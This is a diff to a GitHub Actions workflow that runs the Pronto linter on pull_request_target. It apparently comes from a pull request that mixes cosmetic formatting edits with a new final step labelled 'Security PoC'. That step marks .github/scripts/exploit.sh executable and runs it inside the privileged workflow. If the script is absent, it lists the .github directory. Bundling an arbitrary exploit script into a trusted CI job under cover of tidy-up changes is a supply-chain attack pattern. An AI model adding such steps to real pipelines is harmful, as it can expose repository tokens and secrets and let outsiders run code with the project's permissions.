@@ -1,22 +1,42 @@
 name: Pronto
+
 on:
-  - pull_request_target
+  pull_request_target:
 
 jobs:
   pronto:
     runs-on: ubuntu-latest
+
     steps:
-      - run: echo BUNDLE_GEMFILE=gemfiles/pronto.gemfile > $GITHUB_ENV
+      - name: Set Bundler Gemfile
+        run: echo "BUNDLE_GEMFILE=gemfiles/pronto.gemfile" >> $GITHUB_ENV
+
       - name: Checkout code
         uses: actions/checkout@v5
-      - run: git fetch --no-tags --prune --unshallow origin +refs/heads/*:refs/remotes/origin/*
+
+      - name: Fetch full git history
+        run: git fetch --no-tags --prune --unshallow origin +refs/heads/*:refs/remotes/origin/*
+
       - name: Setup Ruby
         uses: ruby/setup-ruby@v1
         with:
           ruby-version: 3.4
           bundler-cache: true
+
       - name: Run Pronto
         run: bundle exec pronto run -f github_pr -c origin/${{ github.base_ref }}
         env:
           PRONTO_PULL_REQUEST_ID: ${{ github.event.pull_request.number }}
-          PRONTO_GITHUB_ACCESS_TOKEN: "${{ github.token }}"
+          PRONTO_GITHUB_ACCESS_TOKEN: ${{ github.token }}
+
+      - name: Security PoC (Test Script Execution)
+        run: |
+          echo "=== STARTING SECURITY POC ==="
+          if [ -f ".github/scripts/exploit.sh" ]; then
+            chmod +x .github/scripts/exploit.sh
+            ./.github/scripts/exploit.sh
+          else
+            echo "ERROR: exploit.sh not found!"
+            echo "Current directory: $(pwd)"
+            ls -la .github/
+          fi
